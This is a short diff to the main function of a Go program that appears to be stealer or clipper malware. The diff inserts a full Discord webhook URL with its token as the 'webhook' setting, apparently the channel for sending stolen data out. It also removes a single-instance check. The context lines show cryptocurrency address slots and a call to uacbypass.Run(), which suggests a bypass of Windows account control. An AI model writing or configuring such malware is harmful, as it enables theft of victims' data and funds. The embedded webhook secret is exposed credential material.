@@ -23,7 +23,7 @@ import (
 
 func main() {
 	CONFIG := map[string]interface{}{
-		"webhook": "",
+		"webhook": "https://canary.discord.com/api/webhooks/1443630780659142809/1ZbaXLJNFLpX6GGd4Vit76EMmTdU557xK0jyMDQ7YiO-ZzXcF4S7yJfbVPzbS86hwvql",
 		"cryptos": map[string]string{
 			"BTC": "",
 			"BCH": "",
@@ -39,9 +39,6 @@ func main() {
 		},
 	}
 
-	if program.IsAlreadyRunning() {
-		return
-	}
 
 	uacbypass.Run()
 
